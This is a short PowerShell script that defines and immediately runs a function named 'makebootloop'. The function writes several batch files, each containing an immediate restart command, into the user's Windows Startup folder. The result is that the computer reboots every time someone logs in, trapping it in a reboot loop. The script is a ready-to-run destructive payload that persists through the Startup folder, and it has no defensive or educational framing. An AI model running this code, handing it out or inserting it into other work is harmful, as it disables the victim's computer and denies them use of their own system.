function makebootloop {
    param (
        # The hardcoded directory
        [string]$Path = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        
        # How many files do you want to create?
        [int]$Count = 5
    )

    process {
        # 1. Ensure the directory exists
        if (!(Test-Path -Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
        }

        # 2. Loop from 1 to the specified count
        for ($i = 1; $i -le $Count; $i++) {
            
            # Construct the filename: reboot1.bat, reboot2.bat, etc.
            $FileName = "reboot$i.bat"
            $FilePath = Join-Path -Path $Path -ChildPath $FileName
            
            # The command to write into the file
            $Content = "shutdown /r /t 0"
            
            try {
                $Content | Out-File -FilePath $FilePath -Encoding ascii -Force
                Write-Host "Created: $FileName" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to create: $FileName" -ForegroundColor Red
            }
        }
        
        Write-Host "`nDone! All $Count files are in $Path" -ForegroundColor Green
    }
}

# To run it, just call the function name:
makebootloop
